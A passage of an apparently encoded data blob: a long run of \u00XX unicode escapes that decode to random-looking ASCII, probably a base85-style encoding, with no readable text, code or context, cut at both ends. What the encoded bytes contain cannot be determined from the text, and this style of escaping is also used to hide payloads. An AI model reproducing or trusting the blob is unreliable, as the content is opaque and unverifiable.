04d\u0029\u0033\u0029\u002e\u0043\u0073\u0079\u0057\u0048\u006d\u0078\u0076\u002e\u0043\u0032\u0065\u0061\u0043\u0046\u005b\u0079\u003e\u007e\u006d\u0031\u002e\u0077\u005d\u0046\u0038\u002a\u005f\u0053\u0070\u002b\u0021\u0064\u0028\u0068\u0049\u007b\u0046\u0065\u0055\u005f\u0064\u0049\u003f\u0048\u004d\u003d\u0063\u0040\u003f\u006c\u007c\u0077\u0055\u0024\u002c\u0053\u0079\u002e\u007b\u0065\u0022\u0047\u005a\u005a\u0066\u0061\u004a\u0070\u002f\u0025\u0024\u0026\u0031\u0028\u005d\u0052\u0079\u0043\u002a\u005b\u006a\u0062\u0078\u002c\u0059\u007c\u0046\u0076\u0052\u0025\u0043\u0032\u005e\u003d\u002a\u0069\u005e\u0075\u0071\u0034\u0022\u0043\u003a\u002e\u002e\u0067\u002e\u0043\u0022\u006b\u0076\u0061\u0072\u0071\u0071\u0024\u0052\u004b\u004f\u0065\u0058\u006f\u0055\u003a\u0045\u004d\u006e\u005d\u0076\u0054\u002f\u0035\u0075\u0050\u0024\u002a\u0025\u0076\u003e\u0025\u0043\u006c\u0076\u0062\u0075\u004b\u0024\u003e\u003e\u005b\u003d\u005b\u0025\u0060\u004e\u004a\u006a\u0021\u0040\u0050\u0040\u0065\u0062\u0045\u0069\u0062\u0062\u0030\u006f\u0064\u0067\u0053\u005f\u0051\u0051\u0074\u004b\u003b\u007b\u004b\u0070\u0025\u0021\u007a\u0078\u006c\u0037\u003c\u006f\u0028\u006b\u0059\u006d\u0071\u005e\u004e\u0026\u0021\u003b\u0068\u005b\u007d\u005a\u0038\u002c\u0079\u0075\u005a\u0061\u003e\u0044\u0035\u006a\u0030\u0075\u004e\u0060\u0058\u0050\u0060\u0028\u005f\u005a\u006a\u0047\u0040\u0023\u004b\u0026\u0064\u0074\u0069\u002b\u0022\u005e\u0049\u005f\u0073\u003d\u0055\u003a\u0040\u0064\u007c\u003a\u0049\u0058\u0059\u0068\u0056\u006e\u004d\u0071\u0050\u006a\u0062\u003a\u004d\u0076\u0043\u0048\u002f\u0069\u006a\u0030\u0055\u0070\u0076\u007c\u006d\u003e\u0071\u004b\u0047\u0032\u005e\u0068\u0053\u006c\u0051\u0051\u007c\u005b\u0065\u0026\u003d\u004d\u0060\u002a\u0022\u0063\u005a\u0077\u0039\u0021\u0057\u0045\u006c\u005e\u0044\u0077\u006e\u003f\u004c\u007c\u0066\u0054\u0057\u0042\u0028\u0064\u0079\u0075\u003d\u0079\u006f\u0024\u0030\u0075\u002b\u0067\u0047\u007e\u0023\u002c\u004a\u0053\u0054\u0071\u0026\u0024\u0033\u0043\u0028\u002a\u0072\u005d\u006f\u0060\u0039\u004b\u002a\u0057\u007e\u0047\u0034\u007e\u003b\u0043\u0053\u0060\u006b\u0063\u0075\u006e\u0069\u0073\u004c\u0044\u0039\u005f\u0053\u0037\u0076\u0037\u006f\u0031\u007c\u003f\u002a\u0063\u002b\u002b\u0043\u0044\u0028\u0031\u0069\u0073\u004c\u0044\u0039\u005f\u0063\u006a\u0064\u0047\u007c\u0035\u0078\u003e\u007a\u0058\u006d\u005b\u0023\u004f\u004b\u0024\u0061\u007b\u0065\u0022\u0047\u005a\u005a\u0034\u0042\u0047\u004d\u0043\u003b\u0029\u0072\u003f\u0041\u003d\u002b\u005b\u006a\u0055\u002f\u0029\u003c\u003c\u004a\u005b\u0044\u0068\u0043\u0070\u004a\u0070\u0034\u003b\u0068\u003f\u003a\u007e\u0051\u0074\u0055\u003d\u0026\u002b\u004e\u005b\u0047\u002f\u0061\u0043\u004c\u0037\u0031\u002f\u005f\u0072\u0053\u0059\u003f\u0024\u002b\u0043\u0023\u0064\u0062\u005b\u005d\u0049\u005f\u0060\u006a\u0045\u003e\u0052\u004d\u0044\u0030\u0042\u0029\u0028\u002b\u0050\u005e\u005a\u0053\u0025\u0040\u0050\u0040\u0065\u0062\u0045\u0069\u0062\u006a\u003f\u002f\u0043\u0024\u0040\u005b\u0079\u0072\u005f\u0076\u0079\u0028\u0038\u0078\u0029\u006a\u0025\u0062\u0069\u002e\u0030\u0021\u0063\u0028\u0078\u0079\u0074\u003a\u003d\u007d\u0069\u003d\u0028\u0040\u005b\u0026\u006a\u003b\u0034\u007b\u004d\u0025\u0073\u0078\u007e\u003d\u002b\u0042\u0028\u0071\u0065\u0052\u006a\u0025\u0077\u005f\u0064\u0025\u0073\u002e\u0045\u004c\u0070\u003d\u007c\u0079\u002a\u003a\u0043\u0060\u0055\u006d\u0035\u006e\u002b\u002f\u0063\u0049\u0066\u003a\u0028\u0057\u004a\u003c\u005e\u0073\u003e\u0034\u0066\u0074\u004b\u0026\u002b\u006f\u006c\u002b\u002f\u0037\u0065\u0050\u0070\u0060\u005b\u007d\u005a\u0038\u002c\u0079\u0075\u005a\u0061\u003e\u0044\u0035\u006a\u0030\u0075\u004e\u0060\u0058\u006c\u0051\u0034\u005b\u0070\u0043\u0043\u0037\u0077\u003b\u007e\u006d\u0062\u0037\u003c\u0035\u0043\u0044\u0031\u002e\u0079\u0033\u003c\u0077\u0045\u0033\u003a\u004d\u0076\u0043\u0048\u002f\u0069\u006a\u0030\u0055\u0070\u0076\u007c\u006d\u003e\u0071\u004b\u0047\u0032\u005e\u002b\u002f\u0051\u006a\u0046\u0070\u003a\u005d\u0069\u003a\u007c\u0070\u0060\u0033\u0073\u0073\u002e\u0045\u006c\u0051\u005f\u005d\u0048\u002f\u007d\u0046\u006f\u0060\u0034\u003b\u003a\u003f\u0078\u007e\u0039\u0057\u005f\u005d\u0049\u005f\u0035\u0042\u0057\u004e\u0040\u0043\u0057\u0030\u003b\u0045\u0061\u0024\u003a\u004a\u0066\u0035\u005a\u006a\u005e\u003e\u0024\u005d\u0051\u0053\u007e\u002e\u0065\u002f\u002f\u0069\u0048\u003b\u0038\u004f\u0070\u0055\u004c\u004d\u002e\u007b\u007c\u0059\u0048\u0024\u0040\u0051\u0034\u005b\u003d\u003d\u0044\u004e\u0032\u002a\u0061\u003f\u0044\u0063\u0072\u002a\u0076\u005e\u0047\u002a\u0074\u0067\u004a\u003e\u003e\u0025\u0070\u004f\u0079\u0029\u007d\u003a\u002e\u0043\u0075\u0035\u0069\u005e\u0055\u003a\u006a\u005d\u005f\u0072\u0046\u007e\u0060\u004c\u0053\u003c\u0066\u007b\u0065\u0022\u0047\u0035\u004a\u0033\u004f\u0023\u004d\u003e\u0031\u0044\u0030\u0053\u0039\u005f\u0079\u0048\u0028\u0078\u006b\u0038\u0074\u0040\u0051\u004c\u004a\u006c\u0037\u0061\u003e\u0043\u0066\u003a\u0030\u002f\u0063\u0059\u0057\u0076\u0051\u0042\u004a\u004a\u0052\u0063\u0037\u0070\u0050\u004d\u006d\u006d\u0077\u0064\u0062\u005b\u005d\u0049\u005f\u0060\u006a\u0073\u0065\u0037\u006b\u005e\u0025\u0021\u0073\u005b\u004e\u006a\u006e\u004d\u0079\u004d\u003e\u002b\u0051\u0040\u0032\u005e\u007c\u006a\u0077\u006c\u003c\u007d\u006a\u007d\u0069\u003d\u0028\u0040\u005b\u0026\u006a\u0076\u0061\u0076\u0066\u0026\u0066\u0045\u0021\u0028\u0075\u0050\u0073\u003d\u004f\u0071\u004f\u0063\u003d\u0022\u0021\u0026\u006c\u002b\u0077\u0039\u0061\u0070\u0071\u0029\u0040\u005f\u005d\u004b\u0079\u0050\u0068\u007e\u0037\u003d\u0077\u004e\u0046\u0077\u0057\u0076\u005e\u0076\u0050\u0038\u004f\u0055\u003a\u0039\u006c\u005d\u007b\u002e\u0055\u0062\u0030\u0044\u0049\u005f\u0034\u0026\u0057\u004e\u005e\u0046\u005a\u004f\u006c\u003d\u002a\u005d\u0037\u0047\u004d\u0026\u006b\u0043\u006d\u006b\u0049\u002c\u004c\u0025\u005b\u007d\u005a\u0038\u002c\u0079\u0075\u005a\u0061\u003e\u0044\u0035\u006a\u0030\u0075\u004e\u0060\u0058\u0072\u005e\u0046\u0036\u005a\u003d\u003f\u0031\u0036\u0064\u0062\u0063\u0031\u0067\u0079\u003e\u007e\u006d\u0031\u002e\u0077\u005d\u004a\u0024\u002e\u0054\u006b\u003c\u0041\u0047\u0064\u0062\u005f\u0028\u0037\u0078\u006e\u0056\u0050\u0070\u006e\u005a\u003e\u0040\u0068\u0047\u002b\u002b\u004c\u0044\u0078\u005b\u0069\u004f\u0022\u006c\u0051\u0051\u007c\u005b\u0065\u0026\u003d\u004d\u0060\u002a\u0022\u0063\u005a\u0077\u0039\u0021\u0057\u0045\u006c\u0034\u002f\u0071\u006f\u0047\u0070\u0023\u0055\u004d\u0073\u007b\u0029\u0033\u0062\u0026\u006c\u0059\u005b\u003d\u006f\u0021\u006f\u0034\u0066\u0033\u0057\u0030\u0039\u0064\u007b\u0051\u007c\u006f\u006b\u0039\u0061\u004d\u0060\u0050\u0055\u006b\u002a\u0061\u0075\u0061\u0023\u0047\u0066\u003c\u0077\u0060\u0052\u007d\u0056\u006c\u0070\u0058\u004b\u006b\u002a\u0067\u0047\u0069\u0073\u005e\u006c\u006e\u004f\u0033\u004f\u0073\u003e\u004f\u0064\u003f\u0039\u0070\u0041\u0050\u0029\u0037\u0051\u0060\u0035\u004a\u0052\u0074\u0071\u004b\u003b\u0029\u0072\u007e\u0047\u0042\u0062\u005f\u005d\u0053\u002a\u0048\u005e\u0053\u004d\u0072\u0066\u005e\u003f\u002f\u0063\u007c\u0024\u0054\u002c\u002f\u007e\u0061\u007b\u0065\u0022\u0047\u0052\u0035\u0058\u006a\u0046\u006f\u0068\u0036\u0036\u0057\u0026\u0029\u0064\u007b\u005b\u006a\u0062\u0078\u002c\u0059\u007c\u0046\u0032\u002a\u0058\u0072\u0073\u0039\u0046\u006d\u0026\u006c\u0035\u004a\u0033\u004f\u0070\u0055\u0038\u0064\u0065\u0073\u0067\u0047\u0030\u0045\u0022\u0051\u003b\u0050\u006f\u0074\u0043\u0040\u0050\u0040\u0065\u0062\u0045\u0069\u0062\u006a\u003f\u002f\u0043\u0067\u0053\u006e\u0029\u0060\u006c\u006d\u005b\u003f\u0065\u0049\u0050\u003e\u003a\u0025\u0072\u0063\u005b\u0030\u0077\u0057\u0076\u005e\u0076\u0050\u0038\u004f\u0055\u003a\u005f\u005a\u0028\u0060\u003f\u0041\u0068\u0048\u0061\u0044\u0045\u007c\u0073\u003c\u004b\u0060\u0038\u0026\u006a\u0021\u0037\u007d\u006b\u0073\u0071\u0071\u0022\u005e\u003b\u005b\u005b\u007d\u005a\u0038\u002c\u0079\u0075\u005a\u0061\u003e\u0044\u0035\u006a\u0030\u0075\u004e\u0060\u0058\u006c\u0051\u0066\u004f\u0057\u003d\u0070\u0071\u0044\u0021\u0049\u006d\u0062\u0037\u003c\u0035\u0043\u0044\u0031\u002e\u0074\u006f\u0036\u002e\u0056\u0021\u0028\u0069\u002a\u006b\u0042\u004d\u0055\u0043\u0066\u006f\u0073\u003f\u0041\u0054\u0057\u0066\u0057\u0056\u0064\u0021\u0048\u0028\u006c\u006b\u0022\u0065\u0078\u0042\u003f\u0056\u0066\u0045\u0053\u0074\u0067\u0040\u007b\u003a\u0044\u004e\u004a\u006e\u0026\u0042\u003f\u0064\u002e\u004f\u0037\u0076\u0052\u0031\u007a\u0041\u004d\u005f\u0055\u006f\u0073\u003f\u0041\u0054\u0057\u0054\u003a\u0035\u004a\u0050\u0061\u0068\u003e\u0066\u004b\u0025\u006b\u0042\u0029\u005f\u0079\u0048\u0028\u0078\u006b\u0038\u0074\u0040\u0051\u004c\u004a\u006c\u0037\u0061\u003e\u0043\u0066\u003a\u0030\u002f\u0063\u0059\u0057\u0076\u0051\u0042\u004a\u004a\u0052\u0063\u0037\u0070\u0050\u004d\u006d\u006d\u0053\u0043\u0077\u0040\u0050\u0040\u0065\u0062\u0045\u0069\u0062\u0062\u0030\u0061\u0050\u0024\u0053\u0074\u004b\u0032\u0059\u0052\u0054\u004f\u003c\u004a\u005b\u0030\u002e\u0079\u006a\u0044\u0033\u006f\u0065\u0046\u006f\u0030\u0038\u004a\u006a\u007c\u006f\u005d\u0076\u0054\u002f\u0035\u0075\u0050\u0024\u0040\u0077\u003c\u004e\u007b\u0069\u0075\u0053\u0025\u0033\u0074\u0047\u0064\u0022\u003d\u002b\u0076\u0051\u0073\u002e\u0056\u003d\u0048\u0070\u0035\u0025\u0063\u0030\u0061\u003f\u0023\u003e\u006f\u005b\u007d\u005a\u0038\u002c\u0079\u0075\u005a\u0061\u003e\u0044\u0035\u006a\u0030\u0075\u004e\u0060\u0058\u0040\u0051\u0059\u004f\u0061\u005d\u002c\u006f\u003a\u005d\u005f\u0072\u0053\u0059\u0071\u0024\u0064\u0072\u0075\u002e\u0077\u005d\u003f\u004c\u0043\u0054\u0031\u005a\u004f\u005f\u0034\u0043\u0049\u0058\u007a\u0059\u0033\u003b\u005b\u0055\u0067\u0053\u003c\u007e\u0063\u0069\u0048\u005b\u005b\u002f\u0059\u0050\u0054\u0071\u0051\u0042\u005a\u005a\u0044\u004e\u0023\u003e\u005f\u0072\u0021\u0029\u003b\u0045\u0023\u005e\u0023\u004f\u004f\u004f\u003c\u005b\u0074\u0042\u003c\u007e\u0023\u0057\u0064\u0028\u0048\u002f\u0042\u003b\u0072\u0055\u0079\u0034\u004f\u002b\u003c\u007e\u0023\u0057\u0064\u0028\u0048\u002f\u0042\u003b\u0072\u0055\u0079\u0034\u004f\u002b\u003c\u007e\u0023\u0057\u0064\u0028\u0048\u002f\u007a\u0046\u0059\u002e\u0068\u0072\u0061\u0070\u0049\u0060\u005f\u003f\u002f\u0070\u0073\u006c\u0042\u0028\u0021\u0038\u0042\u0026\u004a\u0070\u004e\u003b\u0057\u003a\u0026\u0029\u0058\u0048\u003b\u0043\u004e\u004a\u0033\u004f\u004c\u0058\u0036\u003b\u0022\u003a\u0043\u0068\u006f\u0076\u0021\u0028\u005f\u0065\u006e\u0056\u0073\u003a\u0076\u0072\u0038\u0072\u0077\u0039\u003e\u0074\u0024\u0056\u0032\u0046\u006d\u0032\u0070\u005f\u0058\u004c\u004a\u0040\u0064\u0033\u004f\u006b\u0024\u0026\u0051\u002a\u0068\u0041\u0047\u007b\u002a\u0039\u0051\u002a\u0079\u007c\u0024\u0033\u0056\u0045\u003e\u0075\u002b\u0063\u0047\u004b\u0062\u003a\u0044\u0064\u004b\u0066\u0078\u004c\u0068\u0044\u0031\u0041\u0057\u0036\u006a\u0056\u0069\u003a\u005d\u0029\u0030\u0021\u0045\u0066\u0025\u0028\u0064\u005a\u0038\u003a\u0037\u004a\u003e\u0049\u006b\u0078\u0073\u0048\u0063\u003d\u0024\u0046\u003c\u0021\u002c\u003e\u0039\u002b\u0079\u0028\u0038\u0065\u0031\u0026\u0055\u003a\u0040\u0045\u0029\u0052\u007e\u002e\u004d\u002b\u0054\u0047\u002b\u0077\u0059\u0050\u0050\u0070\u0078\u0065\u0063\u005a\u0065\u0029\u0023\u0048\u002e\u0043\u002b\u0058\u0029\u005e\u0046\u0056\u005f\u0058\u004c\u004a\u0040\u0064\u0033\u004f\u006b\u0024\u0026\u0051\u002a\u0068\u0041\u0047\u007c\u0035\u0041\u004a\u0060\u0038\u0042\u0042\u0044\u004e\u0078\u0065\u007e\u0024\u003e\u0067\u0023\u0057\u0064\u0028\u0048\u002f\u0042\u003b\u0072\u0055\u0079\u0034\u004f\u002b\u0033\u0049\u006f\u0067\u0039\u006d\u0021\u0063\u003c\u007e\u0023\u0057\u0064\u0028\u0048\u002f\u0042\u003b\u0072\u0055\u0079\u0034\u004f\u002b\u0023\u0049\u0052\u004c\u0069\u0070\u003c\u007e\u0023\u0057\u0064\u0028\u0048\u002f\u0042\u003b\u0072\u0055\u0054\u0026\u0044\u004c\u0021\u007d\u006e\u005a\u0060\u007a\u007b\u003c\u003f\u002f\u0037\u0065\u006f\u0060\u0058\u003a\u0063\u0045\u0029\u005a\u0028\u0044\u005a\u0047\u0048\u0064\u007b\u0058\u006a\u0045\u0050\u0031\u006a\u0037\u002e\u0069\u0044\u0048\u007a\u0044\u0074\u0048\u0024\u0078\u003d\u007c\u0031\u003a\u006b\u0022\u004d\u0078\u002b\u004c\u004a\u007c\u0066\u0060\u006a\u003c\u004a\u002f\u0069\u0062\u0051\u0049\u007a\u006f\u0074\u0025\u0056\u0077\u004b\u0062\u003a\u0044\u007c\u0056\u003d\u005d\u007c\u006e\u004c\u0041\u002a\u0078\u0076\u0063\u0028\u0069\u0065\u0058\u006a\u0030\u0064\u0072\u002f\u0049\u002e\u0034\u007e\u003d\u0028\u004c\u004a\u0048\u006a\u0065\u004f\u003e\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0047\u004d\u0024\u005d\u0056\u0053\u003d\u0047\u0067\u0070\u0076\u0051\u0052\u002a\u0075\u006a\u0061\u003e\u004c\u0076\u0058\u0072\u007b\u0029\u003d\u0024\u0064\u0072\u0075\u002e\u0077\u005d\u003f\u004c\u0047\u0069\u004d\u0065\u0050\u0063\u0023\u0023\u0070\u0021\u0073\u0079\u006b\u0029\u0047\u004d\u0021\u003b\u003c\u003a\u0026\u0029\u0059\u0048\u0032\u005e\u005d\u0035\u0073\u006a\u005d\u006c\u006d\u0036\u0073\u0026\u0074\u0071\u0077\u0077\u007c\u006b\u0075\u0041\u007b\u0024\u0046\u007b\u0066\u0066\u0075\u0041\u007b\u0065\u0022\u0047\u0050\u002a\u0034\u003d\u004a\u003e\u0061\u0035\u0072\u0073\u0052\u0039\u0036\u0029\u003c\u0028\u004a\u0079\u0073\u003d\u007e\u0037\u0077\u0066\u003b\u0073\u0029\u0067\u0056\u0056\u006b\u006c\u005e\u0052\u0041\u0065\u0050\u0026\u002a\u0049\u0046\u0039\u0026\u006c\u0051\u002a\u0074\u0023\u0046\u004f\u0076\u0028\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0044\u004e\u0052\u007e\u0024\u006d\u004c\u0044\u004f\u0045\u006f\u0074\u002e\u006a\u003d\u005b\u0079\u003e\u007e\u006d\u0031\u002e\u0034\u006a\u0060\u0021\u003e\u0022\u007b\u0065\u002f\u0069\u0054\u002e\u0024\u0043\u0023\u004d\u0076\u0066\u0026\u0026\u007c\u0059\u0059\u0057\u0028\u0064\u0028\u002a\u005a\u003d\u0053\u004d\u0071\u0034\u003e\u0040\u004a\u0063\u0051\u0073\u0045\u006c\u005e\u0072\u0071\u007b\u006c\u0022\u0034\u002b\u0029\u0070\u007e\u004b\u005e\u002f\u004a\u0064\u0066\u0038\u0021\u0035\u0021\u0022\u0034\u0052\u0047\u002f\u0060\u0079\u004e\u006a\u0031\u003e\u0073\u0035\u0051\u0023\u0077\u0041\u006e\u0063\u006a\u0022\u004d\u0076\u004d\u0058\u007d\u0051\u0056\u0051\u0067\u006a\u0067\u006e\u0061\u0076\u006c\u0067\u0068\u006e\u0032\u006b\u003b\u0050\u0070\u004c\u002e\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0047\u004d\u0024\u005d\u0044\u003a\u0045\u004e\u0060\u0058\u0066\u004a\u0047\u004b\u004b\u0059\u0068\u003e\u0056\u003b\u007a\u0035\u0077\u0070\u004a\u0035\u0043\u0044\u003d\u0066\u006d\u0059\u0060\u0028\u0059\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u003b\u0045\u0042\u005e\u0076\u005e\u0079\u0078\u0059\u005d\u003f\u0043\u006f\u0031\u004e\u0032\u002b\u0029\u0038\u0029\u0021\u004b\u0046\u0036\u007c\u0040\u0064\u006f\u0076\u0035\u0031\u0077\u004e\u002e\u003d\u0034\u0070\u0036\u005b\u0058\u002b\u003d\u0044\u0058\u0030\u0076\u004b\u002e\u0041\u0031\u0057\u0069\u003a\u004c\u002c\u005e\u0044\u0058\u004e\u002e\u0053\u0039\u004c\u0036\u005e\u006c\u0069\u0049\u0044\u0058\u0032\u0025\u0040\u002e\u0060\u0072\u007e\u0030\u004e\u0058\u0074\u007d\u0038\u002a\u004a\u0029\u0052\u005b\u005d\u0050\u0056\u003d\u0021\u0037\u003e\u003b\u0024\u006e\u003f\u0023\u0051\u006c\u0077\u0059\u0036\u0036\u0021\u0028\u002a\u0040\u0040\u0022\u0041\u0071\u0045\u006e\u0021\u0037\u0066\u0051\u0074\u004e\u0035\u0041\u0022\u0062\u003b\u005b\u0052\u002a\u0060\u006a\u004e\u0044\u003f\u002c\u0075\u0030\u0070\u0069\u0074\u0022\u003a\u005e\u0061\u0051\u0078\u0026\u0062\u0031\u0060\u0050\u0043\u0078\u0073\u0042\u0029\u007c\u0024\u0044\u003a\u0068\u0072\u0055\u0061\u0066\u003e\u002a\u0072\u0075\u0032\u0043\u0045\u0044\u0024\u0071\u0068\u005b\u0065\u006c\u0037\u0023\u004e\u004f\u005d\u0060\u0076\u003e\u0036\u0040\u0024\u005f\u006a\u0067\u004f\u0050\u0059\u0047\u004d\u0057\u006b\u003c\u003a\u0045\u004e\u0051\u0074\u0057\u003f\u0075\u004c\u006d\u0069\u0057\u004e\u0074\u0066\u0054\u0040\u007d\u007d\u002e\u004d\u005f\u0058\u0036\u0021\u0028\u002a\u0049\u0024\u0062\u0040\u0048\u0044\u0066\u005f\u0058\u0040\u005e\u0049\u005f\u003f\u006a\u0073\u005f\u0046\u006e\u0074\u0072\u004a\u005b\u004f\u0065\u004e\u006a\u0070\u0030\u0053\u0036\u004a\u0029\u0046\u004a\u005d\u0050\u0023\u0061\u0046\u006e\u0055\u0059\u0070\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0047\u004d\u0024\u005d\u0044\u003a\u0045\u004e\u0060\u0058\u0040\u005e\u005d\u0035\u003c\u006f\u0050\u0070\u0034\u0066\u004f\u0026\u0026\u0058\u004a\u0035\u0043\u0044\u0053\u0048\u0074\u0064\u004d\u004d\u0058\u0054\u0028\u0079\u004a\u004e\u006a\u0070\u002e\u007a\u0060\u0077\u0045\u004e\u0028\u005b\u0065\u0069\u006a\u004a\u0076\u0053\u0060\u0069\u0022\u0035\u0043\u0057\u0049\u005f\u004e\u006a\u0058\u005f\u004e\u003d\u0062\u003f\u006c\u0055\u002e\u005a\u006a\u0032\u0069\u0062\u0078\u0049\u0065\u007a\u0056\u0045\u003d\u006c\u0035\u006b\u0074\u0073\u0064\u0028\u0037\u004e\u002e\u003d\u0034\u0070\u0036\u005b\u0058\u002b\u003d\u0044\u0058\u0030\u0076\u004b\u002e\u0041\u0031\u0057\u0069\u003a\u004c\u002c\u005e\u0035\u0060\u0079\u003d\u003a\u002e\u004e\u002e\u0025\u0040\u0072\u0046\u003b\u0048\u003c\u006f\u004a\u0072\u006e\u002b\u0053\u0059\u004e\u0024\u0036\u0047\u0051\u0042\u0070\u0055\u0074\u0026\u0028\u002b\u0054\u003a\u007a\u005f\u0034\u003d\u006e\u0044\u004f\u005d\u0060\u0076\u003e\u0036\u0040\u0024\u005f\u006a\u0026\u006d\u002b\u002a\u0062\u006e\u0022\u003a\u005e\u0061\u0051\u0078\u0026\u0062\u0031\u0060\u0050\u0043\u0024\u0036\u002a\u0061\u004e\u0070\u002b\u0022\u005e\u0050\u0079\u007c\u0024\u006a\u0036\u007d\u003a\u006a\u0051\u0040\u005b\u0051\u006a\u002a\u003f\u0066\u003a\u007e\u007d\u0040\u002b\u0062\u0055\u006c\u0059\u004f\u0045\u006a\u0064\u0066\u0074\u0078\u0075\u0047\u007e\u0048\u005f\u005d\u0042\u0035\u002a\u0064\u004a\u0041\u002f\u0074\u0024\u005f\u0047\u006b\u0048\u0049\u0066\u0076\u005b\u0022\u006b\u005a\u006a\u0066\u0066\u0023\u0076\u0021\u0061\u0044\u004f\u0045\u006f\u0074\u004c\u0022\u0074\u0053\u0076\u0066\u003f\u0075\u004c\u006d\u0069\u0057\u0022\u0022\u0053\u005e\u0042\u0064\u006e\u002a\u003f\u004c\u0061\u003c\u006d\u005b\u002e\u0078\u007d\u0046\u0073\u004d\u0035\u0025\u006e\u002a\u0046\u0035\u0073\u005b\u0022\u0034\u002b\u0029\u0070\u007e\u004b\u005e\u002f\u004a\u0064\u0066\u0038\u0021\u0035\u0021\u0022\u0034\u0068\u0056\u003b\u0033\u004a\u0046\u004a\u0037\u0063\u003a\u0058\u0053\u0029\u0053\u0067\u0068\u006a\u002b\u002b\u0062\u0051\u0049\u007a\u0052\u006a\u0040\u0033\u0065\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0047\u004d\u0024\u005d\u0044\u003a\u0045\u004e\u0060\u0058\u0052\u0028\u004c\u004a\u0064\u003b\u0060\u0055\u0028\u006b\u007a\u0035\u0077\u0070\u004a\u0035\u0043\u0044\u003d\u0022\u0034\u002c\u0069\u0079\u0056\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u003b\u0045\u0042\u005e\u0076\u005e\u0079\u0078\u0059\u005d\u003f\u0043\u006f\u0031\u004e\u0032\u006d\u0037\u0041\u003e\u0042\u0028\u004a\u0067\u007c\u0040\u0064\u006f\u0076\u004d\u0056\u0071\u0068\u0025\u004e\u002e\u003d\u0034\u0070\u0036\u005b\u0058\u002b\u003d\u0044\u0058\u0030\u0076\u004b\u002e\u0041\u0031\u0057\u0069\u003a\u004c\u002c\u005e\u0035\u0060\u0072\u0055\u007d\u0024\u0045\u002e\u0060\u0072\u0067\u003f\u003a\u004c\u004d\u0064\u0068\u002c\u0064\u0026\u007d\u0046\u0072\u004b\u0072\u0051\u0073\u0023\u0039\u0048\u004f\u0062\u002a\u006b\u0028\u0050\u004a\u0031\u0071\u0076\u0032\u0024\u0056\u0023\u0039\u0048\u0031\u0062\u002a\u006b\u0070\u007a\u004a\u0031\u0071\u0076\u002e\u005a\u0039\u0067\u0070\u0059\u0035\u0022\u0026\u0070\u006f\u0031\u0047\u0063\u004f\u0041\u0054\u0023\u0022\u0051\u004f\u0023\u0068\u0024\u0048\u004d\u0078\u002c\u0042\u0079\u0051\u003b\u0028\u0046\u005e\u0061\u005f\u0079\u0023\u0046\u0047\u004d\u004b\u003b\u0044\u003a\u0045\u004e\u0051\u0074\u0045\u0022\u003a\u005e\u0061\u0051\u0078\u0026\u0062\u0031\u0060\u0050\u0043\u0078\u0073\u0048\u0042\u0039\u0056\u003b\u0078\u0072\u0051\u0040\u005f\u005d\u0073\u0079\u0040\u0068\u003a\u0037\u0041\u003e\u0060\u0042\u006d\u004b\u0035\u0067\u002a\u0051\u007c\u006e\u005f\u003e\u0042\u007e\u0037\u002a\u0062\u0074\u0038\u0079\u0068\u0036\u0037\u006c\u004e\u0054\u0053\u004b\u0079\u003e\u0079\u006b\u0032\u0061\u0043\u0075\u0023\u0035\u0064\u0076\u0041\u004a\u0070\u0065\u006e\u0056\u0073\u003a\u0037\u0029\u0030\u0048\u0063\u003f\u0075\u004c\u006d\u0069\u0057\u0022\u0022\u0053\u005e\u0049\u005d\u005f\u003a\u002b\u0036\u0076\u002e\u0043\u0049\u0058\u0057\u0048\u003a\u0037\u0048\u0055\u0060\u0073\u006c\u0042\u0028\u0021\u0038\u0042\u0026\u004a\u0070\u0060\u0051\u0029\u0046\u005a\u004f\u006c\u003d\u002a\u0034\u006a\u0030\u002b\u0038\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0047\u004d\u0024\u005d\u0044\u003a\u0045\u004e\u0060\u0058\u0072\u005e\u0046\u0036\u005a\u003d\u002b\u004c\u0048\u004a\u0071\u006a\u0049\u0058\u004a\u0035\u0062\u0071\u002c\u003b\u004b\u006a\u0022\u003a\u005e\u0061\u0051\u0078\u0026\u0062\u0031\u0060\u0050\u0043\u0078\u0073\u0042\u0029\u007c\u0024\u0024\u0056\u0047\u0065\u0049\u005e\u004b\u0073\u0033\u005b\u0065\u004c\u0045\u0069\u002b\u0022\u005e\u0049\u005f\u0075\u006a\u006b\u0043\u0078\u0053\u004e\u0054\u0044\u0024\u0041\u003c\u0059\u0025\u0037\u0065\u0050\u0070\u004f\u005d\u0060\u0076\u003e\u0036\u0040\u0024\u006d\u0070\u0055\u0078\u0049\u0066\u0076\u005b\u0022\u006b\u0034\u003d\u0053\u004d\u0034\u0066\u0060\u006a\u0055\u005a\u0030\u0079\u0061\u0034\u0078\u0076\u0063\u0028\u0046\u0042\u004e\u006a\u0074\u0023\u0068\u0046\u0052\u0025\u0075\u0055\u0055\u0029\u0040\u005b\u007d\u005a\u0038\u002c\u0079\u007a\u007a\u0047\u004d\u0024\u005d\u0056\u0053\u003d\u0047\u0067\u0070\u0076\u0051\u0052\u002a\u002f\u003d\u0032\u0040\u0069\u0053\u007a\u0035\u0077\u0070\u004a\u0035\u0043\u0044\u0049\u0046\u006c\u0070\u0076\u0037\u0035\u0025\u0065\u006d\u0072\u004e\u0060\u0058\u0033\u0043\u0028\u002a\u0054\u0034\u005b\u003e\u0066\u004c\u0073\u0062\u0062\u0037\u003c\u0035\u003d\u0072\u0074\u0067\u007c\u0068\u0072\u0021\u003c\u0036\u005a\u006a\u006f\u0058\u006f\u0069\u0033\u007b\u0065\u0022\u0047\u0050\u002a\u0034\u003d\u0050\u0070\u0030\u007e\u0041\u0057\u0054\u002f\u0031\u0079\u0073\u003d\u003c\u0069\u0044\u005b\u002b\u003c\u0042\u004a\u0023\u0040\u005b\u006a\u0039\u005f\u006f\u0074\u0031\u0021\u003c\u004e\u002b\u005a\u0055\u004a\u0073\u005b\u004e\u006a\u006a\u006c\u003f\u0069\u0073\u004b\u004a\u0052\u0024\u003a\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u003b\u0045\u0042\u005e\u0076\u005e\u0079\u0078\u0059\u